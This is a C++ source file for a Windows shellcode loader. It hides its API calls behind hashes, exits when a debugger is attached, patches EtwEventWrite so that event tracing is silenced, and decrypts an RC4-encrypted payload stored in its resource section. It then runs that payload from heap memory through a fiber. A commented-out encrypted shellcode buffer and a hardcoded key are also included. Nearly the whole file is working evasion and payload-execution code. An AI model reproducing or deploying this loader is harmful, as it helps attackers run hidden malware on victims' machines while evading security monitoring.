#include <iostream>
#include <Windows.h>
#include "defs.h"
#include "struct.h"

#include "typedefs.h"
#include "resource.h"

#include "api.h"
#include "hashing.h"
#include "rc4.h"

//pfnSleep pSleep = (pfnSleep)_GetProcAddress(_GetModuleHandle((LPCWSTR)k32), strSleep);
//unsigned char buf[] = "\x90\xb6\xf4\x21\x96\x67\x07\xc0\xc7\x5e\x34\x96\x93\x4b\x2a\x1f\x32\x80\x1b\x3f\x63\x53\xad\xc1\xb4\x66\x4a\xe1\x07\x58\x55\x6f\xe1\x53\x08\x2b\xa8\xe1\x18\x44\xc1\xdf\x76\x9d\x7b\xe3\xb8\xc2\x0a\xcb\x74\x57\x6a\x16\x08\xc1\xe3\xb5\x32\xc8\x72\x07\xa0\x89\xca\xfd\xe0\xb3\x4d\x5d\x36\x7d\x0d\x32\xc3\xc2\x20\x57\x0d\xb1\x09\x5c\x39\x32\x1b\x1f\x4b\x4a\x71\x29\xe1\xf3\x03\x3d\x1a\x6f\xe9\x2a\x84\xaf\xc1\x11\x59\xc9\xfc\xe1\x43\x69\x27\xe0\x63\x3b\xf2\xf4\x9f\x5f\x3d\xb2\x2f\x3e\x73\xc3\x21\xa9\x14\xa0\x8c\x5e\x10\xd7\xfd\xff\x40\xa8\x9a\x72\xf1\xa3\x1f\xce\xb3\x7d\x52\x85\x7a\x9a\x2f\x20\x94\xb0\x5e\xac\x6b\xb3\xae\x35\xdf\xf2\x4e\xd0\x7e\x68\x58\x8b\xbc\xde\xde\x80\x6f\xb5\x05\xf6\x30\xb6\xd0\x3c\x85\x2b\x17\x75\xf3\x78\x2b\x1b\x5d\xc1\x91\x53\x6a\xdb\xd8\xf5\x97\x63\xfe\x0f\x16\x4e\xb5\xbd\x10\xdd\x1a\x5e\xe5\xbd\x9f\xfe\xf6\x1f\xc0\xb6\x6f\xd8\x23\xa7\x01\xc5\x0e\x2e\x94\xc0\x1b\x08\x42\x30\xf6\x5c\x35\x40\xdb\xfc\x7a\xf4\x77\xf9\x1c\xa4\xf5\x27\x63\xa0\x96\x5d\xdd\xa5\xa4\x49\x71\x87\xe7\x3c\x1c\xe1\x8a\x8f\xfe\xde\x8b\x5b\x3a\xf4\x62\x9a\xbc\xa2\xb9\x0e\x47\x21\xa4\xd7\xae\x2f\xa5\xf7\x75\x15\x85\x7c\x8a\x72\x93\x9a\xc2\x70\x12\x68\x84\xf4\xe8\xb2\xe7\xdb\x30\x48\xb4\x01\xbd\x78\x32\x70\x79\xb1\x2e\x39\xec\x42\xae\x42\x9e\xe4\xec\x97\x00\xa4\x9c\x0e\x7b\x8e\x6f\xe6\x43\x1c\xee\xa7\x9e\xd0\x50\x19\x8a\xaf\x7b\xed\xfe\xb0\x20\x8d\x20\x27\xa9\xec\xed\x6b\x8b\xa9\xee\x1e\xbe\x88\x2e\x37\xc0\xde\x1c\xd5\x3f\x76\x4d\xa9\x82\x3b\x68\x46\x3d\x06\x43\x24\x56\xaa\x45\x6f\x68\xd5\xee\xd3\xe9\x23\xe5\x16\x9e\x07\x53\x0f\x59\x82\x95\x01\x49\xb5\x8f\x33\x77\x8e\xb6\x53\x65\x38\x79\x5c\x37\x24\x38\xa2\x15\x49\xf0\x1a\x58\xec\x23\xa3\xa1\xd9\xe9\xfd\x46\xd3\x95\xc7\x4f\xfa\x93\x19\x4f\xd5\x73\xb6\x6c\x90\xec\xc8\x8c\xf8";
//SIZE_T bufSize = sizeof(buf);

FARPROC GetNTAPIAddress(DWORD64 NTApiName) {

	HMODULE hmodule;
	FARPROC address;

	hmodule = _GetModuleHandle(NTDLL_HASH);
	if (hmodule == NULL) {
		return NULL;
	}

	address = _GetProcAddress(hmodule, NTApiName);
	if (address == NULL) {
		return NULL;
	}


	return address;
}

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = (char*)dest;
	char* s = (char*)src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}

BOOL Debuggiee() {
	BOOL ret = FALSE;

	BOOL isDebuggerPresent = FALSE;
	if (CheckRemoteDebuggerPresent(NtCurrentProcess(), &isDebuggerPresent))
	{
		if (isDebuggerPresent)
		{
			printf("[-] Stop debugging program!\n");
			ret = TRUE;
		}
		else {
			printf("[+] No debugging program!\n");
		}
	}

	return ret;
}

BOOL ETWStopper() {
	pfnVirtualProtect pVirtualProtect = (pfnVirtualProtect)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), VIRTUALPROTECT_HASH);
	LPVOID ETWAddress = GetNTAPIAddress(ETWEVENTWRITE_HASH);

	printf("[*] EtwEv3ntWrite Address ( %p )\n", ETWAddress);

	DWORD oldProtect = 0;
	DWORD oldOldProtect = 0;

	const char* ret = "\xc3";

	if (!pVirtualProtect(ETWAddress, sizeof(ret), PAGE_READWRITE, &oldProtect)) {
		return FALSE;
	}

	VxMoveMemory(ETWAddress, (char*)ret, sizeof(ret));
	
	if (!pVirtualProtect(ETWAddress, sizeof(ret), oldProtect, &oldOldProtect)) {
		return FALSE;
	}

	return TRUE;
}

BOOL MemDecrypt(PVOID ptr, DWORD sSize, const char* key, DWORD keyLength) {

	NTSTATUS STATUS = NULL;

	struct ustring _data;
	struct ustring _key;

	_key.Buffer = (PUCHAR)key;
	_key.Length = keyLength;

	_data.Buffer = (PUCHAR)ptr;
	_data.Length = sSize;

	// Allocated memory address pointer
	if ( ( STATUS = CryptMemory032(ptr, sSize, (char*)key, (DWORD)keyLength ) ) != STATUS_SUCCESS) {
		printf("[-] Crypt function failed\n");
		return FALSE;
	}
	else {
		printf("[+] Crypt function success\n");
	}

	return TRUE;
}

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow) {
int main() {

	t_FindResourceW C_FindResourceW = (t_FindResourceW)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), FINDRESOURCEW_HASH);
	t_LoadResource C_LoadResource = (t_LoadResource)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), LOADRESOURCE_HASH);
	t_LockResource C_LockResource = (t_LockResource)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), LOCKRESOURCE_HASH);
	t_SizeofResource C_SizeofResource = (t_SizeofResource)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), SIZEOFRESOURCE_HASH);

	// Generate a resource.rc & resource.h poiting to a file of binary (raw) type shellcode
	// .rsrc storage && .rsrc payload extraction
	HRSRC res = C_FindResourceW(NULL, MAKEINTRESOURCE(IDR_PAYLOAD1), RT_RCDATA);
	HGLOBAL resHandle = C_LoadResource(NULL, res);
	unsigned char* payload = (unsigned char*)C_LockResource(resHandle);
	ULONG sSize = C_SizeofResource(NULL, res);

	const char key[] = { 'X','@','f','8','k','d','3','T','D','o','!','r','j','E' };
	DWORD sizeKey = sizeof(key);

	
	if (Debuggiee()) {
		return 0;
	}

	BOOL etwsuccess = FALSE;

	if (ETWStopper() == FALSE) {
		printf("[-] Can't silence ETW\n");
		return EXIT_FAILURE;
	}

	printf("[+] ETW Silenced\n");

	pfnVirtualProtect pVirtualProtect = (pfnVirtualProtect)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), VIRTUALPROTECT_HASH);

	LPVOID cFiber = NULL;
	LPVOID hAlloc = NULL;
	PVOID pHeapLock = NULL;
	PVOID hHandle = NULL;

	pfnConvertThreadToFiber pConvertThreadToFiber = (pfnConvertThreadToFiber)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), CONVERTTHREADTOFIBER_HASH);
	LPVOID ThreadToFiber = pConvertThreadToFiber(NULL);

	pfnRtlCreateHeap pRtlCreateHeap = (pfnRtlCreateHeap)_GetProcAddress(_GetModuleHandle(NTDLL_HASH), RTLCREATEHEAP_HASH);
	if ( ( hHandle = pRtlCreateHeap(HEAP_GROWABLE, NULL, NULL, sSize, NULL, NULL) ) == NULL ) {
		printf("[-] Failed creating heap\n");
		return -99;
	}
	
	pfnRtlAllocateHeap pRtlAllocateHeap = (pfnRtlAllocateHeap)_GetProcAddress(_GetModuleHandle(NTDLL_HASH), RTLALLOCATEHEAP_HASH);

	if ( ( hAlloc = pRtlAllocateHeap(hHandle, HEAP_ZERO_MEMORY, sSize) ) == NULL) {
		printf("[-] Failed to allocate heap\n");
		return -99;
	}

	// Move and decrypt
	VxMoveMemory(hAlloc, payload, sSize);
	MemDecrypt(hAlloc, sSize, key, sizeKey);

	pfnCreateFiber pCreateFiber = (pfnCreateFiber)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), CREATEFIBER_HASH);
	cFiber = pCreateFiber(NULL, (LPFIBER_START_ROUTINE)hAlloc, NULL);
	if (cFiber == NULL) { return -2; }

	DWORD oldProtection = 0;
	if (!pVirtualProtect(hAlloc, sSize, PAGE_EXECUTE_READ, &oldProtection)) { return -2; };

	pfnSwitchToFiber pSwitchToFiber = (pfnSwitchToFiber)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), SWITCHTOFIBER_HASH);
	pSwitchToFiber(cFiber);

	return 0;
}